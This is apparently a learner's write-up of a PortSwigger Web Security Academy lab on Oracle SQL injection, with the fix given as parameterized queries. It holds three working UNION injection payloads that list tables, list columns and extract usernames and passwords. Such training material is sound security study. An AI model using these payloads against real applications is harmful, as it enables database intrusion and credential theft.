# Lab 6 — SQL Injection: Listing Database Contents (Oracle)

**Platform:** PortSwigger Web Security Academy
**Difficulty:** Practitioner
**Status:** Solved

## Vulnerability
SQL Injection — UNION attack to enumerate Oracle database and extract credentials

## Summary
Performed full database enumeration on Oracle database. Used Oracle-specific system tables to retrieve table names, columns, and admin credentials.

## Payloads Used

### Step 1: Get all tables
```
' UNION SELECT table_name,NULL FROM all_tables--
```

### Step 2: Get columns from users table
```
' UNION SELECT column_name,NULL FROM all_col_comments WHERE table_name='USERS_ABCXYZ'--
```

### Step 3: Extract credentials
```
' UNION SELECT USERNAME,PASSWORD FROM USERS_ABCXYZ--
```

## Steps
1. Found injection point in category parameter
2. Determined column count (2 columns, both strings)
3. Listed tables using Oracle's `all_tables`
4. Found users table with random suffix
5. Listed columns using `all_col_comments`
6. Extracted credentials
7. Logged in as administrator

## Key Oracle Differences
- No `information_schema` → use `all_tables` and `all_columns`
- Every SELECT needs FROM → use `FROM dual` for single row
- Table names are UPPERCASE in Oracle

## Impact
Full credential theft — administrator account compromised.

## Fix
Parameterized queries. Restrict DB user permissions.
